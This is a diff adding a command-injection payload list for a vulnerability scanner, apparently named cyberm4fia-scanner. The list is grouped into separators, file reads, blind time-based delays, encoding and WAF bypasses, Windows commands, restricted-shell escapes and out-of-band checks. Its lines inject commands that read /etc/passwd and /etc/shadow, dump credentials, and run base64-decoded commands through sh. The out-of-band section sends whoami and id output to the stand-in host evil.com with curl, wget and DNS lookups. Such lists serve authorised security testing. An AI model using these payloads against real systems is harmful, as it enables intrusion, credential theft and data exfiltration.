@@ -1,0 +1,310 @@
+# CMDi Payloads — cyberm4fia-scanner
+# Categories: Separators, Commands, Encoding, Blind, Bypass, Windows, Out-of-Band
+
+# ─── Basic Separators + Commands ───
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; whoami
+| whoami
+|| whoami
+& whoami
+&& whoami
+`whoami`
+$(whoami)
+; uname -a
+| uname -a
+`uname -a`
+$(uname -a)
+;id
+|id
+||id
+&id
+&&id
+
+# ─── File Read ───
+; cat /etc/passwd
+| cat /etc/passwd
+`cat /etc/passwd`
+$(cat /etc/passwd)
+& cat /etc/passwd
+&& cat /etc/passwd
+; cat /etc/hosts
+| cat /etc/hosts
+; cat /etc/shadow
+; cat /etc/hostname
+; cat /etc/issue
+| type C:\windows\win.ini
+| type C:\windows\system32\drivers\etc\hosts
+; head -n 5 /etc/passwd
+; tail -n 5 /etc/passwd
+; less /etc/passwd
+; more /etc/passwd
+; tac /etc/passwd
+; nl /etc/passwd
+; sort /etc/passwd
+; rev /etc/passwd | rev
+; xxd /etc/passwd | head
+; base64 /etc/passwd
+
+# ─── Directory Listing ───
+; ls -la
+| ls -la
+`ls -la`
+$(ls -la)
+; ls -la /
+| ls -la /
+; dir
+| dir
+& dir
+; find / -name "*.conf" 2>/dev/null
+; find / -perm -4000 2>/dev/null
+; ls -la /home/
+; ls -la /tmp/
+; ls -laR /var/www/
+
+# ─── Network ───
+; ping -c 3 127.0.0.1
+| ping -c 3 127.0.0.1
+& ping -c 3 127.0.0.1
+&& ping -c 3 127.0.0.1
+; ping -n 3 127.0.0.1
+| ping -n 3 127.0.0.1
+& ping -n 3 127.0.0.1
+; curl http://127.0.0.1
+| wget http://127.0.0.1
+; ifconfig
+| ifconfig
+$(ifconfig)
+; ip addr
+| ip addr
+; netstat -an
+| netstat -an
+; ss -tlnp
+; arp -a
+; route -n
+; ip route
+; nslookup localhost
+; dig localhost
+
+# ─── Blind (Time-based) ───
+; sleep 5
+| sleep 5
+& sleep 5
+&& sleep 5
+`sleep 5`
+$(sleep 5)
+|| sleep 5
+; sleep 10
+| sleep 10
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+; timeout 5
+| timeout 5
+& ping -n 5 127.0.0.1 &
+& timeout /T 5 &
+; sleep 3
+| sleep 3
+$(sleep 3)
+`sleep 3`
+; python -c "import time;time.sleep(5)"
+; python3 -c "import time;time.sleep(5)"
+; perl -e "sleep 5"
+; ruby -e "sleep 5"
+
+# ─── Encoding Bypass ───
+;+id
+|+id
+%0a id
+%0a whoami
+%0d id
+%0d whoami
+%0a%0d id
+;${IFS}id
+|${IFS}id
+;${IFS}whoami
+|${IFS}whoami
+;$IFS'id'
+;{id}
+$({id})
+;`echo${IFS}id`
+;echo${IFS}`id`
+%0aid
+%0awhoami
+%0did
+%0dwhoami
+;%20id
+|%20id
+%0a%0did
+%09id
+%09whoami
+$IFS;id
+;{cat,/etc/passwd}
+;cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+;cat</etc/passwd
+
+# ─── Quote / Concatenation Bypass ───
+;i'd'
+;w'h'oami
+;"/b"in/id
+;/b\in/id
+;i\d
+;wh\oami
+;ca\t /et\c/pas\swd
+;c''at /e''tc/p''asswd
+;c""at /e""tc/passwd
+;$(echo id)
+;$(echo${IFS}id)
+;w`echo h`oami
+;/bin/c`echo a`t /etc/passwd
+;$(printf '\x69\x64')
+;$(echo -e '\x69\x64')
+;echo d2hvYW1p | base64 -d | sh
+;echo aWQ= | base64 -d | sh
+;$(echo d2hvYW1p | base64 -d)
+;$(echo aWQ= | base64 -d)
+;echo${IFS}d2hvYW1p|base64${IFS}-d|sh
+
+# ─── Wildcard / Glob Bypass ───
+;cat /etc/pass??
+;cat /etc/p*d
+;cat /e?c/p?ss?d
+;/???/??t /???/??????
+;/???/???/???l /???/??????
+;/???/??d
+;cat /etc/p[a]sswd
+;cat /et[c]/passwd
+;/bi?/ca? /et?/pa??wd
+
+# ─── Variable Based ───
+;$HOME
+;echo $PATH
+;echo $USER
+;echo $HOSTNAME
+;env
+;set
+;printenv
+;export
+;echo $SHELL
+;echo $TERM
+;echo $LANG
+;echo $HOME
+;echo $PWD
+;echo $OLDPWD
+;echo $LOGNAME
+
+# ─── Windows Specific ───
+& whoami
+& dir C:\
+& type C:\windows\win.ini
+& type C:\windows\system32\drivers\etc\hosts
+& net user
+& net localgroup administrators
+| net user
+& ipconfig /all
+& systeminfo
+& tasklist
+| tasklist
+& cmdkey /list
+& set
+& echo %USERNAME%
+& echo %COMPUTERNAME%
+& echo %USERDOMAIN%
+; powershell -c "whoami"
+| powershell -c "Get-Process"
+& powershell IEX(whoami)
+& wmic os get Caption
+& wmic useraccount list brief
+& net share
+& net view
+& arp -a
+& route print
+| powershell -ep bypass -c "Get-ChildItem env:"
+& reg query HKLM\SOFTWARE
+& schtasks /query
+& powershell -c "Get-Service"
+& powershell -c "$env:UserName"
+& powershell -c "[System.Environment]::OSVersion"
+& type C:\inetpub\wwwroot\web.config
+& dir /s /b C:\*.config
+
+# ─── Advanced / Chained ───
+;id;whoami;uname -a
+|id|whoami
+$(echo 'id' | sh)
+echo 'whoami' | bash
+;bash -c 'id'
+;sh -c 'whoami'
+;python -c "import os; os.system('id')"
+;python3 -c "import os; os.system('id')"
+;perl -e 'system("id")'
+;ruby -e 'system("id")'
+;php -r 'system("id");'
+;node -e "require('child_process').execSync('id').toString()"
+;lua -e 'os.execute("id")'
+;awk 'BEGIN{system("id")}'
+;xargs -I% sh -c 'id'
+;find . -exec id \;
+;busybox id
+
+# ─── Out-of-Band / DNS ───
+; nslookup evil.com
+; dig evil.com
+; curl http://evil.com/
+; wget http://evil.com/
+; ping -c 1 evil.com
+$(nslookup evil.com)
+`nslookup evil.com`
+; curl http://evil.com/$(whoami)
+; nslookup $(whoami).evil.com
+; ping -c 1 $(whoami).evil.com
+; wget --post-data="$(id)" http://evil.com/
+
+# ─── Restricted Shell Escape ───
+;/bin/sh
+;/bin/bash
+;sh
+;bash
+;zsh
+;python -c "import pty;pty.spawn('/bin/sh')"
+;python3 -c "import pty;pty.spawn('/bin/sh')"
+;perl -e 'exec "/bin/sh"'
+;vi -c ':!sh'
+;awk 'BEGIN{system("/bin/sh")}'
+;find / -exec /bin/sh \;
+;nmap --interactive
+
+# ─── Advanced WAF Bypass & Base64 Run ───
+`echo bHMgLWxh | base64 -d`
+$(echo bHMgLWxh | base64 -d)
+`echo%20bHMgLWxh%20|%20base64%20-d`
+$(echo%20bHMgLWxh%20|%20base64%20-d)
+`printf "\x69\x64"`
+$(printf "\x69\x64")
+a=l;b=s;$a$b
+
+# ─── Spaceless Executions ───
+${IFS}ls${IFS}LA
+;id<
+;ls<
+>ls<
+%0Aid%0A
+%0D%0Aid%0D%0A
+!ls!
+a=ls%0a$a
+
+# ─── Blind Delays ───
+sleep 10
+;sleep 10;
+|sleep 10|
+&sleep 10&
+$(sleep 10)
+`sleep 10`
+timeout 10
+ping -c 10 127.0.0.1
+
